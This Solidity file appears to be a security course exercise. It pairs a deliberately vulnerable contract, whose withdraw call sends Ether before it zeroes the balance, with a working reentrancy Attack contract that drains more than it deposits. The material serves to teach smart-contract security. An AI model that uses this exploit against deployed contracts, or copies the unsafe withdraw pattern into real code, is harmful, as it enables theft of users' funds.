pragma solidity ^0.5.0;

contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

contract Attack {
    // In this part, you’ll write and use a contract that steals funds from the Vuln contract. Your goal is
    // to make a contract that includes a payable function, that interacts with the Vuln contract to steal
    // funds from it. Your contract should let you pay it a small amount (e.g. 0.1 ETH), and then later
    // let you extract a greater amount (e.g. 0.2 ETH). If we look at the (internal) transactions between
    // your contract and the Vuln contract, we should see that yours sends (deposits) less than it gets back
    // (withdraws) from the Vuln contract.
    
    Vuln public vuln;
    int x = 2;
    constructor(address _vulnAddress) public
    {
        vuln = Vuln(_vulnAddress);
    }
    function() external payable 
    {
        x = x - 1;
        if (x > 0) {
            vuln.withdraw();
        }
    }
    function attack() public payable 
    {
        
        vuln.deposit.value(0.1 ether)();
        vuln.withdraw();
    }
    function getBalance() public view returns (uint) 
    {
        return address(this).balance;
    }
}
